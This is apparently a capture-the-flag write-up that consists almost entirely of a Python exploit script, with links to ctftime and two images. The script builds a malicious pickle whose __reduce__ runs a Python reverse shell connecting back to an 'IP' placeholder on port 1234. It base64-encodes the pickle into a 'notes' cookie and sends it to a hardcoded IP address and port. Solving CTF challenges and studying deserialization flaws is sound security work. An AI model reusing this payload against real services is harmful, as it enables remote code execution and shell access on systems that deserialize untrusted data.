![image](https://github.com/stensil4rt/CodeBy/assets/62753044/bcae232a-ffbc-42cc-87f0-3c688e4091a1)

https://ctftime.org/writeup/36628

```python
#!/usr/bin/env python3
import pickle, os, base64
import requests

class P(object):
    def __reduce__(self):
        return (os.system,('''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' ''',))

def main():
    pickledPayload = base64.b64encode(pickle.dumps(P())).decode()
    print(f'[*] Payload: {pickledPayload}')

    URL = 'http://62.173.140.174:16040/add_note'
    cookie = {
        'notes': pickledPayload
    }

    print('[*] Request result:')
    orderRequestResult = requests.get(URL, cookies=cookie)
    print(orderRequestResult.text)

if __name__ == '__main__':
    main()
```

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/49603b17-d96b-4906-b6ea-0b668adf8f0c)

